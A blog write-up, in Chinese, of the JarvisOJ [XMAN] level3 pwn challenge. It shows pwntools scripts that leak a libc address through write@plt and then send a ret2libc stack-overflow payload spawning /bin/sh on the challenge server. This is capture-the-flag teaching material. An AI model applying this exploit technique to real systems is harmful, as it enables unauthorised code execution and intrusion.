---
layout:     post
title:      jarvisoj [XMAN]level3
author:     wooy0ung
tags: 		pwn
category:  	writeup
---


>Problem Address:  
>https://www.jarvisoj.com  
>  
>Download:  
>https://dn.jarvisoj.com/challengefiles/level3.rar.1ce2f904ead905afbadd33de1d0c391d  
>  
>Address:  
>nc pwn2.jarvisoj.com 9879  
<!-- more -->


### 0x00 可执行文件特征

```
file level3
checksec level3
chmod a+x ./level3
./level3
```

![](/assets/img/writeup/pwn/2017-06-16-jarvisoj-level3/0x00.png)

![](/assets/img/writeup/pwn/2017-06-16-jarvisoj-level3/0x01.png)


### 0x01 放到IDA分析

构造write调用，将got表中read的真实地址打印出来

![](/assets/img/writeup/pwn/2017-06-16-jarvisoj-level3/0x02.png)

查看write在plt表的地址

![](/assets/img/writeup/pwn/2017-06-16-jarvisoj-level3/0x03.png)

查看read在got表的地址

![](/assets/img/writeup/pwn/2017-06-16-jarvisoj-level3/0x04.png)

```
from pwn import *

write_addr = p32(0x08048340)
read_got_addr = p32(0x0804A00C)
vulner_addr = p32(0x0804844B)

payload = 'A' * (0x88 + 0x04)
payload += write_addr
payload += vulner_addr
payload += p32(0x01)	# stdout 1
payload += read_got_addr
payload += p32(0x04)

# Io = process('./level3')
Io = remote('pwn2.jarvisoj.com', 9879)
Io.recvuntil('Input:\n')
Io.send(payload)
tmp = Io.recv(4)
read_addr = u32(tmp[0:4])
print hex(read_addr)
```

![](/assets/img/writeup/pwn/2017-06-16-jarvisoj-level3/0x05.png)

配合libc可计算出system和/bin/sh的地址

![](/assets/img/writeup/pwn/2017-06-16-jarvisoj-level3/0x06.png)


### 0x02 最终的exploit如下


```
#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

write_addr = 0x08048340
read_got_addr = 0x0804A00C
vulner_addr = 0x0804844B

payload = "A" * (0x88 + 0x04)
payload += p32(write_addr)
payload += p32(vulner_addr)
payload += p32(0x01)		# stdout 1
payload += p32(read_got_addr)
payload += p32(0x04)

# Io = process('./level3')
Io = remote('pwn2.jarvisoj.com', 9879)
Io.recvuntil("Input:\n")
Io.send(payload)
tmp = Io.recv(4)
read_addr = u32(tmp[0:4])

read_libc_addr = 0x000daf60
offset = read_addr - read_libc_addr

system_addr = offset + 0x00040310
exit_addr = offset + 0x00033260
bin_sh_addr = offset + 0x16084c

payload = "A" * (0x88 + 0x04)
payload += p32(system_addr)
payload += p32(exit_addr)
payload += p32(bin_sh_addr)

Io.sendline(payload)
Io.interactive()
```

得到falg

![](/assets/img/writeup/pwn/2017-06-16-jarvisoj-level3/0x07.png)